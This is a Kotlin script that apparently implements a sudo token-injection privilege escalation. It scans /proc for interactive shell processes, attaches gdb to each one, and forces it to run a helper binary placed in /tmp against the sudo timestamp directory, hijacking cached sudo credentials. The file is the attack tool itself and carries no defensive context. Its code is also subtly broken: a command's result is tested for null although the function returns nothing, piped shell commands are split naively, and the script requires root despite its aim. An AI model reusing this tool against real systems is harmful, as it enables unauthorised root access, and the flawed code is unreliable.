import java.io.File
import java.io.IOException
import java.nio.file.Files
import java.nio.file.Paths

fun runCommand(command: String) {
    try {
        val process = ProcessBuilder(*command.split(" ").toTypedArray())
            .redirectErrorStream(true)
            .start()
        process.waitFor()
    } catch (e: IOException) {
        println("Error running command: $command")
        e.printStackTrace()
    }
}

fun injectSudoToken(pid: Int) {
    val command = """
        echo 'call system("echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* >/dev/null 2>&1")' |
        gdb -q -n -p $pid >/dev/null 2>&1
    """.trimIndent()

    runCommand(command)
}

fun main() {
    // Check if the script is being run as root
    if (System.getProperty("user.name") != "root") {
        println("This script must be run as root.")
        return
    }

    // Copy the sudo token activation script to /tmp and make it executable
    runCommand("cp activate_sudo_token /tmp/")
    runCommand("chmod +x /tmp/activate_sudo_token")

    // Retrieve the sudo timestamp directory
    val timestampDirCommand = "sudo --version | grep 'timestamp dir' | grep -o '/.*'"
    val timestampDir = runCommand(timestampDirCommand)
    if (timestampDir == null) {
        println("Could not retrieve timestamp directory.")
        return
    }

    // Iterate over processes owned by the current user
    val procDir = File("/proc")
    val userName = System.getProperty("user.name")

    procDir.listFiles()?.forEach { file ->
        if (file.isDirectory && file.name.matches(Regex("\\d+"))) {
            val pid = file.name.toInt()
            val commFile = File("/proc/$pid/comm")

            if (commFile.exists()) {
                val comm = commFile.readText().trim()
                if (comm in listOf("bash", "zsh", "sh", "csh", "ksh", "tcsh", "dash") && pid != ProcessHandle.current().pid()) {
                    println("Injecting process $pid -> $comm")
                    injectSudoToken(pid)
                }
            }
        }
    }
}
